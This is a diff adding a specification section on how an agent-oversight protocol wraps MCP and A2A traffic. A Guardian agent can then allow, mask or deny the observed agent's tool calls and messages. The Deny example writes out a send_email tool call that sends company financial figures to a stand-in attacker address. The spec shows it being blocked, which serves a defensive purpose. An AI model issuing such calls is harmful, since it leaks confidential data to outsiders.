@@ -1,0 +1,253 @@
+Protocol bindings {#bindings}
+=============================
+
+ACS carries MCP and A2A traffic intact rather than replacing either. A binding specifies how
+the underlying protocol's messages travel inside the ACS envelope and how ACS decisions
+apply to them.
+
+MCP {#binding-mcp}
+------------------
+
+The Model Context Protocol [[MCP]] is an open standard for connecting AI agents to external
+tools, prompts, resources, and servers.
+
+[=ACS-Core=] remains protocol-agnostic: ordinary tool invocations can be governed through
+[=hook/toolCallRequest=] and [=hook/toolCallResult=] regardless of whether the underlying
+transport is MCP, HTTP, a local function call, or another mechanism. The `protocols/MCP/*`
+namespace is an optional precision layer for deployments that need to preserve MCP-specific
+semantics on the wire.
+
+ACS wrapping for MCP carries MCP messages between the [=Observed Agent=] and the
+[=Guardian Agent=] while preserving the underlying MCP method and payload. This lets a
+Guardian apply the standard ACS disposition contract to MCP traffic without making MCP the
+only tool-governance path.
+
+Deployments MAY collapse MCP `tools/call` traffic into the generic [=hook/toolCallRequest=]
+and [=hook/toolCallResult=] hooks when tool-level policy is sufficient. Deployments SHOULD
+use `protocols/MCP/*` when policy needs MCP-level distinctions that generic tool hooks would
+erase, including:
+
+- `initialize` capability negotiation, including server instructions and capability grants
+    that occur before the first tool call.
+- `prompts/get`, where a server-authored prompt template is fetched and may later enter the
+    agent's LLM context.
+- `resources/read` and resource subscriptions, which represent data flow rather than
+    one-shot tool invocation.
+- `notifications/*`, which represent asynchronous MCP signals.
+
+### Requirements ### {#binding-mcp-requirements}
+
+1. An agent using MCP and claiming MCP wrapping MUST deliver wrapped MCP messages to the
+    Guardian using `protocols/MCP/*` ([[#hook-mcp]]).
+2. An agent using MCP wrapping MUST understand and enforce ACS responses before forwarding
+    outbound MCP messages or consuming inbound MCP results.
+
+### Flow ### {#binding-mcp-flow}
+
+1. Agent **A** prepares an MCP-compliant message.
+2. Agent **A** uses ACS as a transport to send the message to the Guardian Agent.
+3. The Guardian processes the wrapped MCP message and sends the result back to agent **A**.
+4. Agent **A** interprets and enforces the response.
+5. If the response is `allow`, agent **A** sends the MCP message to the MCP server.
+6. The MCP server processes the message and responds to agent **A**.
+7. Agent **A** uses ACS as a transport to send the MCP response to the Guardian.
+8. The Guardian processes the wrapped MCP response and sends the result back to agent **A**.
+9. Agent **A** interprets and enforces the response.
+
+### Examples ### {#binding-mcp-examples}
+
+<div class=example>
+**Allow.** Agent **A** asks an MCP server for the weather.
+
+The MCP `tools/call` message agent **A** prepares:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "method": "tools/call",
+  "params": {
+    "arguments": { "city": "Barcelona" },
+    "name": "get_weather"
+  }
+}
+```
+
+Wrapped as `protocols/MCP/tools/call`:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 70,
+  "method": "protocols/MCP/tools/call",
+  "params": {
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "arguments": { "city": "Barcelona" },
+      "name": "get_weather"
+    }
+  }
+}
+```
+
+The Guardian's response:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 70,
+  "result": {
+    "decision": "allow",
+    "message": "Allow tools/call.",
+    "reasoning": "I understand that this is an MCP message. An agent is asking the weather. Nothing suspicious here."
+  }
+}
+```
+</div>
+
+<div class=example>
+**Modify.** Agent **A** asks an MCP server to send an email carrying sensitive data. The
+Guardian returns the rewritten request:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 80,
+  "result": {
+    "decision": "modify",
+    "message": "Modified data for tools/call.",
+    "reasoning": "I understand that this is an MCP message. An agent is asking to send an email with sensitive info, I need to mask it first.",
+    "modifiedRequest": {
+      "jsonrpc": "2.0",
+      "id": 80,
+      "method": "protocols/MCP/tools/call",
+      "params": {
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "tools/call",
+        "params": {
+          "arguments": {
+            "to": "finance@company.io",
+            "from": "manager@company.io",
+            "subject": "Employee Salary Raise Request",
+            "body": "Hi, I would like to ask for a salary raise for employee #12222. The current salary is **********$, the requested salary is **********$. Let's have a meeting discuss this."
+          },
+          "name": "send_email"
+        }
+      }
+    }
+  }
+}
+```
+</div>
+
+<div class=example>
+**Deny.** Agent **A** asks an MCP server to send financial data to an outside recipient:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 100,
+  "method": "protocols/MCP/tools/call",
+  "params": {
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "arguments": {
+        "to": "hacker@hack.com",
+        "subject": "Financial info",
+        "body": "The ARR for the company for year 2024 was 100000000000$ "
+      },
+      "name": "send_email"
+    }
+  }
+}
+```
+
+The Guardian's response:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 100,
+  "result": {
+    "decision": "deny",
+    "message": "Deny tools/call.",
+    "reasoning": "I recognize disallowed content: financial data leaving for an external recipient."
+  }
+}
+```
+</div>
+
+A2A {#binding-a2a}
+------------------
+
+*This section is non-normative in v0.1.0.* The `protocols/A2A/*` namespace is reserved and
+recognized in the handshake's `wrapped_protocols` for forward compatibility, but the
+detailed method mapping is deferred to v0.2 ([[#deferred]]). What follows is the working
+draft the v0.2 binding will be specified from.
+
+A2A [[A2A]] is a communication protocol that lets AI agents exchange information, coordinate
+actions, or delegate tasks in a structured way. It defines how two or more agents exchange
+messages, requests, responses, and task results, so agents built on diverse frameworks by
+different companies and running on separate servers can collaborate.
+
+The ACS extension for A2A is a **transport** for A2A communications between the agent and
+the Guardian: ACS carries the A2A message as-is. Securing A2A means securing both outbound
+and inbound messages. An Observed Agent may be an A2A client agent (which initiates
+requests), an A2A server or remote agent (which exposes an A2A-compliant endpoint and
+processes tasks), or both.
+
+The working draft's two requirements are that agents using A2A use ACS as the transport for
+delivering A2A messages to the Guardian, and that they understand and enforce the ACS
+responses they receive.
+
+### Flow ### {#binding-a2a-flow}
+
+1. Client agent **A** prepares an A2A-compliant message.
+2. Client agent **A** uses ACS as a transport to send the message to the Guardian.
+3. The Guardian processes the transported A2A message and returns the result to **A**.
+4. Client agent **A** interprets and enforces the response.
+5. If the response is `allow`, **A** sends the A2A message to server agent **B**.
+6. Server agent **B** uses ACS as a transport to send the received message to the Guardian.
+7. If the response is `allow`, **B** processes the message and prepares an A2A-compliant
+    response.
+8. Server agent **B** uses ACS as a transport to send the response to the Guardian.
+9. The Guardian processes the transported A2A response and returns the result to **B**.
+10. Server agent **B** interprets and enforces the response.
+11. If the response is `allow`, **B** sends the A2A response to client agent **A**.
+12. Client agent **A** uses ACS as a transport to send the A2A response to the Guardian,
+    using the protocol's `method` field as the request method name.
+13. The Guardian processes the transported A2A response and returns the result to **A**.
+14. Client agent **A** interprets and enforces the response.
+
+### Hooks under consideration ### {#binding-a2a-hooks}
+
+<table class="data">
+  <caption>A2A events the v0.2 binding is expected to wrap</caption>
+  <thead>
+    <tr><th>A2A event<th>Fires on
+  <tbody>
+    <tr><td>Send Message Request<td>A message send to an agent, initiating a new interaction
+        or continuing an existing one.
+    <tr><td>Stream Message Request<td>A message send that also subscribes the client to
+        real-time task updates over Server-Sent Events.
+    <tr><td>Cancel Task Request<td>A task cancel request.
+    <tr><td>Get Task Request<td>Retrieval of the current state — status, artifacts, and
+        optionally history — of a previously initiated task.
+    <tr><td>Get Task Push Notification Config Request<td>Retrieval of the push-notification
+        configuration for a task.
+    <tr><td>Set Task Push Notification Config Request<td>An update to the push-notification
+        configuration for a task.
+    <tr><td>Resubscribe To Task Request<td>A client reconnecting to an SSE stream for an
+        ongoing task after an interrupted connection.
+</table>
+
+Per-event request and response examples for the working draft are maintained alongside the
+documentation, under
+<a href="https://github.com/afogel/ACS_official/tree/dev/docs/spec/instrument/a2a/hooks">`docs/spec/instrument/a2a/hooks/`</a>.
+Those examples predate the v0.1.0 envelope and will be re-cut against
+[[#wire-envelope|the request envelope]] when the binding is specified.
